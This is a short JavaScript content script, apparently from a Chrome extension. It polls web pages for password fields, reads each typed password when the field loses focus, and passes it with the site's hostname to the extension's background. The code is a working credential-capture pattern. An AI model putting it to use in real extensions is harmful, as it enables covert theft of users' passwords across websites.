function doThis() {
  let inputs = $('input[type=password]');
  inputs.each(function(i, input) {
    if ($(input).data("seen") == true) {
      return;
    } else {
      console.log("found a new input field password");
      $(input).data("seen", true);
      assignBlur(input);
    }
  })
}

function assignBlur(newInput) {
  console.log("assignBlur");
  $(newInput).blur(function() {
    console.log("blur done");
    // console.log(newInput);
    var password = $(this).val();
    x = {
      url: window.location.hostname,
      password: password
    };

    chrome.runtime.sendMessage({
      "data": x
    }, function(request) {
      console.log("response from sendMessage:", request);
    });
  });
}

setInterval(doThis, 300);